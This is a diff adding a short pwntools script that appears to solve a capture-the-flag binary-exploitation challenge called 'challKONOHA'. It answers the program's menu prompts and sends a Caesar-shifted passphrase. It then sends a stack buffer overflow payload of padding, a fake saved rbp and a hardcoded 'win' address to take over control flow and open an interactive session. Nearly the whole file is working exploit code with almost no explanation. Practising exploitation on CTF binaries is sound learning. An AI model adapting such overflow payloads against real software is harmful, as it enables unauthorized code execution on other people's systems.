@@ -1,0 +1,34 @@
+from pwn import *
+
+# bof to overwrite the return address + return rbp
+
+p = process("./challKONOHA")
+'''
+p = gdb.debug("./challKONOHA", gdbscript = 
+b *sharingan + 373
+r
+)
+'''
+
+e = ELF("./challKONOHA")
+rbp_fake = e.symbols['secret'] + 0x80
+win = 0x000000000040195d
+
+p.sendlineafter(b"name: ", b"vani5hing")
+p.sendlineafter(b"you? ", b"19")
+p.sendlineafter(b"major? ", b"tank")
+
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"", b"9.31.8|106.7|207.15")
+
+p.sendlineafter(b"> ", b"3")
+st = b'I_LOVE_NARUTO'
+payload = b''
+for i in range(len(st)):
+    payload += bytes([st[i] + 3])
+p.sendlineafter(b"that???", payload)
+
+payload = b'A' * 0x40 + p64(rbp_fake) + p64(win)
+p.sendlineafter(b"read it??\n", payload)
+
+p.interactive()
